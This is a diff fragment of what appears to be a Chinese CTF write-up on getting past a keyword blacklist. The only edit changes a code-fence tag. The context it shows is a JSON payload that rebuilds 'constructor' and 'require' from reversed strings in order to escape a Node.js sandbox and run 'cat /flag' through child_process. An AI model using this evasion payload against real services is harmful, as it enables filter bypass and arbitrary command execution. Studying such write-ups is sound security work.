@@ -147,7 +147,7 @@ value内容包括了黑名单内容会被拦截，
 4. 使用反向字符串绕过
     
 
-```JSON
+```json
 {
   "code": "this['rotcurtsnoc'.split('').reverse().join('')]['rotcurtsnoc'.split('').reverse().join('')]('return process')().mainModule['eriuqer'.split('').reverse().join('')]('child_process').execSync('cat /flag').toString()"
 }
